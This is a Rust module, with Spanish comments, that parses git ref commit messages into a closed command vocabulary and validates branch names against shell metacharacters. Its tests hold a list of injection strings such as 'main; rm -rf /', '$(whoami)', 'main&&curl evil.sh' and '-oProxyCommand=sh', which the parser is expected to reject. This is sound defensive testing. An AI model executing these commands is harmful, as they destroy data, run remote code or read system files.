//! El mensaje de un commit sobre la ref **es** el comando que lo produjo.
//!
//! De un vocabulario cerrado, con los argumentos validados uno por uno. Es lo que
//! vuelve el registro verificable por replay: *el comando más el árbol del primer
//! padre determinan el árbol resultante*, así que quien quiera comprobar un commit
//! corre el comando contra el padre y compara tree oids.
//!
//! **Un mensaje se parsea, nunca se ejecuta.** Lo escribe cualquiera —un push viene
//! de afuera— y un verificador que se lo pasara a una shell tendría ejecución remota
//! en su runner. Por eso el vocabulario es cerrado, cada argumento se valida contra
//! su tipo, y lo que sale de acá es una forma estructurada con la que se arma argv:
//! nunca una línea de comando.
//!
//! **La gramática no es retroactiva.** La ref es append-only y los commits que ya
//! están no se pueden reescribir, así que la ausencia del trailer `Bilinker-Version`
//! significa *"anterior a la gramática"* y no es un error. Con el trailer puesto, el
//! mensaje tiene que parsear; sin él, no se lo interroga. Es [`read`], contra
//! [`parse`], que es el estricto.

use anyhow::{bail, Context, Result};

/// La versión de **este** crate, no la del formato.
///
/// [ADR-0006](../../docs/adr/0006-formato-como-crate-versionado.md) ata la versión
/// del formato a `bilink-format`, pero `hash`, `hash_ast` y el recorte de bordes
/// viven acá: un cambio en cualquiera movería los hashes sin bumpear el formato, y
/// el replay de commits viejos empezaría a fallar sin que nada esté mal.
pub const VERSION: &str = env!("CARGO_PKG_VERSION");

const TRAILER_VERSION: &str = "Bilinker-Version";
const TRAILER_INVOCATION: &str = "Invocation";

/// El comando canónico de un commit de la ref.
///
/// **Cada variante nombra el objeto sobre el que actuó**, y nada más: el endpoint
/// para una decisión, la rama de origen para una sincronización, el commit traído
/// para una absorción, la rama que nace para un corte.
#[derive(Debug, Clone, PartialEq)]
pub enum RefCommand {
    /// Tipo 1. El commit va abreviado a propósito: es el segundo padre del commit,
    /// así que acá es una ayuda de lectura y no el dato autoritativo.
    Absorb { project: String },
    /// Tipo 1 — **la ref nace**, herede o no.
    ///
    /// El corte no tiene verbo propio: es el caso "no hay de quién heredar" del
    /// mismo comando, y uno aparte nombraría un `bilinker corte` que no existe. Lo
    /// que los separa son los padres —el corte tiene uno solo, y no es de la ref—
    /// que es como [`Repo::classify`](crate::bilink_ref::Repo::classify) distingue
    /// cualquier commit de la ref.
    Track { branch: String },
    /// Tipo 2 — una decisión, por endpoint.
    Accept { place: bool, content: bool, uuid: String, n: u8 },
    /// Tipo 2 — una decisión, por `link` repuntado.
    Apply { uuid: String, n: u8, capture: String },
    /// Tipo 3.a. Sin endpoint: trae **todo** lo que el vecino decidió, y el conjunto
    /// sale del merge a tres puntas entre los dos padres, que ya están en el objeto.
    Adopt { branch: String },
    /// Tipo 3.b — traer lo que otro aceptó en **esta misma** rama. Nombra el remoto
    /// y no una rama, que es lo que lo separa de `adopt`: la fuente es la copia que
    /// el remoto tiene de esta misma ref.
    Pull { remote: String },
}

impl RefCommand {
    /// La primera línea canónica, sin prosa.
    pub fn line(&self) -> String {
        match self {
            Self::Absorb { project } => format!("absorb {}", abbrev(project)),
            Self::Track { branch } => format!("track {branch}"),
            Self::Accept { place, content, uuid, n } => {
                let flag = match (place, content) {
                    (true, false) => " --place",
                    (false, true) => " --content",
                    _ => "",
                };
                format!("accept{flag} {uuid}.{n}")
            }
            Self::Apply { uuid, n, capture } => format!("apply {uuid}.{n} {capture}"),
            Self::Adopt { branch } => format!("adopt {branch}"),
            Self::Pull { remote } => format!("pull {remote}"),
        }
    }
}

/// Un mensaje completo: comando, prosa opcional, y los trailers.
#[derive(Debug, Clone, PartialEq)]
pub struct RefMessage {
    pub command: RefCommand,
    /// Lo que va después de `: ` en la primera línea. Para quien lee.
    pub prose: Option<String>,
    /// Lo que la persona tipeó. **Auditoría, no verificación**: un `accept .` de
    /// veinte endpoints escribe veinte commits, y cada uno lleva su propio comando.
    pub invocation: Option<String>,
    pub version: String,
}

impl RefMessage {
    pub fn new(command: RefCommand) -> Self {
        Self { command, prose: None, invocation: None, version: VERSION.to_string() }
    }

    pub fn with_prose(mut self, prose: impl Into<String>) -> Self {
        self.prose = Some(one_line(&prose.into()));
        self
    }

    /// Lo que la persona tipeó, aplanado a una línea.
    ///
    /// Aplanarlo no es cosmética: un argumento con un salto de línea adentro podría
    /// fabricar un trailer que nadie escribió.
    pub fn with_invocation(mut self, argv: impl IntoIterator<Item = String>) -> Self {
        let joined = argv.into_iter().collect::<Vec<_>>().join(" ");
        self.invocation = Some(one_line(&joined));
        self
    }

    pub fn render(&self) -> String {
        let mut out = self.command.line();
        if let Some(p) = &self.prose {
            out.push_str(": ");
            out.push_str(p);
        }
        out.push_str("\n\n");
        if let Some(i) = &self.invocation {
            out.push_str(&format!("{TRAILER_INVOCATION}: {i}\n"));
        }
        out.push_str(&format!("{TRAILER_VERSION}: {}\n", self.version));
        out
    }
}

/// Qué dice el mensaje de un commit ya escrito.
#[derive(Debug, Clone, PartialEq)]
pub enum Read {
    /// Sin `Bilinker-Version`. **No es un error**: es un commit anterior a la
    /// gramática, y la ref no se reescribe.
    PreGrammar,
    Parsed(RefMessage),
}

/// Lee el mensaje de un commit, tolerando la historia anterior a la gramática.
pub fn read(message: &str) -> Result<Read> {
    match trailer(message, TRAILER_VERSION)? {
        None => Ok(Read::PreGrammar),
        Some(_) => Ok(Read::Parsed(parse(message)?)),
    }
}

/// Parsea un mensaje **estricto**: sin trailer, con un verbo desconocido o con un
/// argumento del tipo equivocado, falla.
pub fn parse(message: &str) -> Result<RefMessage> {
    let version = trailer(message, TRAILER_VERSION)?
        .context("el mensaje no tiene el trailer Bilinker-Version")?;
    let invocation = trailer(message, TRAILER_INVOCATION)?;

    let subject = message.lines().next().unwrap_or("").trim_end();
    let (head, prose) = match subject.split_once(": ") {
        Some((h, p)) => (h, Some(p.trim().to_string())),
        None => (subject, None),
    };

    let mut words = head.split_whitespace();
    let verb = words.next().context("el mensaje está vacío")?;
    let args: Vec<&str> = words.collect();

    let command = match (verb, args.as_slice()) {
        ("absorb", [c]) => RefCommand::Absorb { project: commit(c)? },
        ("track", [b]) => RefCommand::Track { branch: branch(b)? },
        ("adopt", [b]) => RefCommand::Adopt { branch: branch(b)? },
        // Un nombre de remoto tiene las mismas restricciones que uno de rama: es lo
        // que git acepta, y es el único argumento no hexadecimal del vocabulario.
        ("pull", [r]) => RefCommand::Pull { remote: branch(r)? },

        ("accept", [e]) => {
            let (uuid, n) = endpoint(e)?;
            RefCommand::Accept { place: true, content: true, uuid, n }
        }
        ("accept", [flag, e]) => {
            let (place, content) = match *flag {
                "--place" => (true, false),
                "--content" => (false, true),
                other => bail!("`accept` no acepta la flag '{other}'"),
            };
            let (uuid, n) = endpoint(e)?;
            RefCommand::Accept { place, content, uuid, n }
        }

        ("apply", [e, c]) => {
            let (uuid, n) = endpoint(e)?;
            RefCommand::Apply { uuid, n, capture: capture_id(c)? }
        }

        // Un verbo del vocabulario con la cantidad de argumentos equivocada, y un
        // verbo que no está en el vocabulario, son el mismo error: el mensaje no
        // describe ningún acto reproducible.
        ("absorb" | "track" | "adopt" | "pull" | "accept" | "apply", _) => bail!(
            "`{verb}` no lleva los argumentos '{}'", args.join(" ")
        ),
        _ => bail!(
            "'{verb}' no es un verbo del vocabulario de la ref \
             (absorb, track, accept, apply, adopt, pull)"
        ),
    };

    Ok(RefMessage { command, prose, invocation, version })
}

// ─── validación de argumentos, uno por tipo ──────────────────────────────────

/// `<uuid>.<N>` — un uuid y un índice que es `0` o `1`, nunca otra cosa.
fn endpoint(s: &str) -> Result<(String, u8)> {
    let (u, n) = s.rsplit_once('.')
        .with_context(|| format!("'{s}' no tiene la forma <uuid>.<N>"))?;
    let n = match n {
        "0" => 0u8,
        "1" => 1u8,
        other => bail!("'{other}' no es un índice de endpoint: son 0 o 1"),
    };
    Ok((uuid(u)?, n))
}

fn uuid(s: &str) -> Result<String> {
    let body_ok = s.len() >= 8
        && s.chars().all(|c| c.is_ascii_hexdigit() || c == '-')
        && s.chars().any(|c| c.is_ascii_hexdigit());
    if !body_ok {
        bail!("'{s}' no es un uuid de bilink");
    }
    Ok(s.to_string())
}

/// Un id de capture es el hash de su ubicación: 32 hex, ni uno más.
fn capture_id(s: &str) -> Result<String> {
    if s.len() != 32 || !s.chars().all(|c| c.is_ascii_hexdigit()) {
        bail!("'{s}' no es un id de capture");
    }
    Ok(s.to_string())
}

/// Un sha, entero o abreviado. Nunca menos de 7: por debajo de eso no identifica.
fn commit(s: &str) -> Result<String> {
    if !(7..=40).contains(&s.len()) || !s.chars().all(|c| c.is_ascii_hexdigit()) {
        bail!("'{s}' no es un commit");
    }
    Ok(s.to_string())
}

/// Un nombre de rama, con las reglas de `git check-ref-format` que importan acá.
///
/// **Es la validación que hace que un mensaje no pueda ser un comando de shell.** El
/// nombre de rama es el único argumento que no es hexadecimal, así que es el único
/// por donde entraría un metacaracter — y ninguno de los que importan sobrevive a
/// esta lista.
fn branch(s: &str) -> Result<String> {
    const FORBIDDEN: &[char] = &[
        ' ', '\t', '~', '^', ':', '?', '*', '[', '\\', '"', '\'', '`', '$', '&',
        ';', '|', '<', '>', '(', ')', '{', '}', '!', '#', '\n', '\r',
    ];
    let bad = s.is_empty()
        || s.len() > 255
        || s.contains("..")
        || s.contains("//")
        || s.contains("@{")
        || s.starts_with('/')
        || s.starts_with('-')
        || s.ends_with('/')
        || s.ends_with(".lock")
        || s.ends_with('.')
        || s.chars().any(|c| c.is_ascii_control() || FORBIDDEN.contains(&c));
    if bad {
        bail!("'{s}' no es un nombre de rama");
    }
    Ok(s.to_string())
}

// ─── helpers ─────────────────────────────────────────────────────────────────

/// El valor de un trailer, y **el error si aparece dos veces**.
///
/// Dos `Bilinker-Version` en un mensaje son dos respuestas a la misma pregunta, y
/// elegir una —la última, la primera— es una regla que un verificador tendría que
/// conocer para coincidir. Rechazarlo es más barato que documentarlo.
fn trailer(message: &str, key: &str) -> Result<Option<String>> {
    let prefix = format!("{key}: ");
    let mut hits = message.lines().filter_map(|l| l.strip_prefix(&prefix));
    let first = hits.next().map(|v| v.trim().to_string());
    if hits.next().is_some() {
        bail!("el mensaje tiene más de un trailer {key}");
    }
    Ok(first)
}

fn one_line(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn abbrev(sha: &str) -> &str {
    &sha[..sha.len().min(12)]
}

#[cfg(test)]
mod tests {
    use super::*;

    const UUID: &str = "7f3d8e9a-1234-4abc-8def-0123456789ab";
    const CAP: &str = "3ca90f8112345678901234567890abcd";

    fn round(cmd: RefCommand) -> RefCommand {
        let rendered = RefMessage::new(cmd.clone()).with_prose("prosa libre").render();
        let back = parse(&rendered).expect("tiene que parsear lo que se escribió");
        assert_eq!(back.prose.as_deref(), Some("prosa libre"));
        assert_eq!(back.version, VERSION);
        back.command
    }

    /// Todo lo que bilinker escribe se lee de vuelta igual. Es el contrato mínimo:
    /// sin esto, el replay no tiene de dónde salir.
    #[test]
    fn every_command_survives_the_round_trip() {
        for cmd in [
            RefCommand::Absorb { project: "24ae0f6b64f4c0de1234567890abcdef12345678".into() },
            RefCommand::Track { branch: "feature/x".into() },
            RefCommand::Accept { place: true, content: true, uuid: UUID.into(), n: 0 },
            RefCommand::Accept { place: true, content: false, uuid: UUID.into(), n: 1 },
            RefCommand::Accept { place: false, content: true, uuid: UUID.into(), n: 1 },
            RefCommand::Apply { uuid: UUID.into(), n: 1, capture: CAP.into() },
            RefCommand::Adopt { branch: "main".into() },
            RefCommand::Pull { remote: "origin".into() },
            RefCommand::Track { branch: "rc-2.35".into() },
        ] {
            let back = round(cmd.clone());
            // `absorb` es el único que no vuelve idéntico: el sha se abrevia a
            // propósito, porque el dato autoritativo es el segundo padre.
            match (&cmd, &back) {
                (RefCommand::Absorb { project: a }, RefCommand::Absorb { project: b }) => {
                    assert!(a.starts_with(b.as_str()) && b.len() == 12, "{a} → {b}");
                }
                _ => assert_eq!(cmd, back),
            }
        }
    }

    /// La primera línea es el comando, y se lee sin abrir nada más.
    #[test]
    fn the_subject_is_the_command() {
        let m = RefMessage::new(RefCommand::Accept {
            place: true, content: false, uuid: UUID.into(), n: 0,
        })
        .with_prose("spec de check ↔ check_structural");
        assert_eq!(
            m.render().lines().next().unwrap(),
            format!("accept --place {UUID}.0: spec de check ↔ check_structural")
        );
    }

    /// **Un commit sin `Bilinker-Version` no se rechaza**: es anterior a la
    /// gramática, y la ref no se reescribe.
    #[test]
    fn a_message_without_the_trailer_is_pre_grammar_and_not_an_error() {
        for viejo in [
            "accept .: 9 endpoint(s)\n\n- 7f3d8e9a.0\n- 3a4b5c6d.1",
            "bilinker: repuntar MOVED (2026-08-30)",
            "corte 005: los bilinks salen de la rama",
            "sync: main hasta 24ae0f6",
        ] {
            assert_eq!(read(viejo).unwrap(), Read::PreGrammar, "sobre: {viejo}");
        }
    }

    /// Con el trailer puesto, el mensaje **tiene** que parsear.
    #[test]
    fn with_the_trailer_the_message_must_parse() {
        let m = "accept .: 9 endpoint(s)\n\nBilinker-Version: 0.1.0";
        let err = read(m).unwrap_err().to_string();
        assert!(err.contains("no es un índice de endpoint"), "{err}");
    }

    #[test]
    fn an_unknown_verb_invalidates_the_message() {
        for verbo in ["rebase main", "corte main", "cut main"] {
            let msg = format!("{verbo}\n\nBilinker-Version: 0.1.0");
            let err = parse(&msg).unwrap_err().to_string();
            assert!(err.contains("no es un verbo del vocabulario"), "sobre '{verbo}': {err}");
        }
    }

    #[test]
    fn an_argument_of_the_wrong_type_is_rejected() {
        let cases = [
            (format!("accept {UUID}.2"), "no es un índice de endpoint"),
            ("accept nope.0".to_string(), "no es un uuid"),
            (format!("accept --force {UUID}.0"), "no acepta la flag"),
            (format!("apply {UUID}.0 nocap"), "no es un id de capture"),
            ("absorb zzzz".to_string(), "no es un commit"),
            (format!("absorb {UUID}"), "no es un commit"),
            (format!("apply {UUID}.0"), "no lleva los argumentos"),
            ("adopt".to_string(), "no lleva los argumentos"),
        ];
        for (subject, expected) in cases {
            let msg = format!("{subject}\n\nBilinker-Version: 0.1.0");
            let err = parse(&msg).unwrap_err().to_string();
            assert!(err.contains(expected), "sobre '{subject}': {err}");
        }
    }

    /// **El parser no ejecuta nada, y no puede llegar a hacerlo.**
    ///
    /// El nombre de rama es el único argumento que no es hexadecimal, así que es el
    /// único por donde entraría un metacaracter. Ninguno pasa — y lo que sí pasa
    /// sale como un `String` que se pone en argv, nunca en una línea de comando.
    #[test]
    fn a_message_with_shell_metacharacters_is_rejected() {
        let ataques = [
            "adopt main; rm -rf /",
            "adopt $(whoami)",
            "adopt `id`",
            "adopt main&&curl evil.sh",
            "adopt main|sh",
            "adopt ../../etc/passwd",
            "adopt -oProxyCommand=sh",
            "adopt 'main'",
            "adopt main>/dev/null",
            // No es una inyección de shell, pero sí una ambigüedad: dos respuestas a
            // la misma pregunta, y elegir una sería una regla más que conocer.
            "track main\nBilinker-Version: 0.0.0",
        ];
        for a in ataques {
            let msg = format!("{a}\n\nBilinker-Version: 0.1.0");
            assert!(parse(&msg).is_err(), "tenía que rechazarse: {a}");
        }

        // Y una rama legítima con puntos y barras sí pasa, entera y sin escapar.
        let m = parse(&format!(
            "adopt release/2.35.x\n\nBilinker-Version: {VERSION}"
        ))
        .unwrap();
        assert_eq!(m.command, RefCommand::Adopt { branch: "release/2.35.x".into() });
    }

    /// El trailer `Invocation:` guarda lo que la persona tipeó, aplanado: un salto
    /// de línea adentro podría fabricar un trailer que nadie escribió.
    #[test]
    fn the_invocation_trailer_cannot_forge_another_trailer() {
        let m = RefMessage::new(RefCommand::Adopt { branch: "main".into() })
            .with_invocation(["bilinker".into(), "adopt\nBilinker-Version: 9.9.9".into()]);
        let rendered = m.render();
        let trailers = rendered.lines().filter(|l| l.starts_with("Bilinker-Version: ")).count();
        assert_eq!(trailers, 1, "el salto quedó aplanado y no fabricó nada:\n{rendered}");
        assert_eq!(parse(&rendered).unwrap().version, VERSION);
    }
}
